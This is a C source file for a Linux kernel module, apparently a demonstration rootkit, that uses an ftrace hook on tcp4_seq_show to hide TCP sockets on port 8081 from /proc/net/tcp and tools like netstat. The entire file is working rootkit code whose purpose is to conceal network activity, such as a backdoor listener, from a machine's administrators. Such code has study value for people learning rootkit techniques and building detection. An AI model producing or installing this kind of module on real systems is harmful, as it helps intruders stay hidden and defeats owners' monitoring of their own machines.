#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/tcp.h>
#include <linux/seq_file.h> // required for seq_start_token
#include <net/sock.h>       // required for struct sock and sk_num
#include "ftrace_helper.h"

#define HIDE_PORT 8081

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("Port Hiding Module");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    // check if this is the "header" line or a real socket
    if (v != SEQ_START_TOKEN) 
    {
        // sk_num is stored in host byte order, so 8081 works directly
        if (sk->sk_num == HIDE_PORT) 
        {
            printk(KERN_INFO "rootkit: hiding port %d\n", HIDE_PORT);
            return 0;
        }
    }

    return orig_tcp4_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = 
{
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);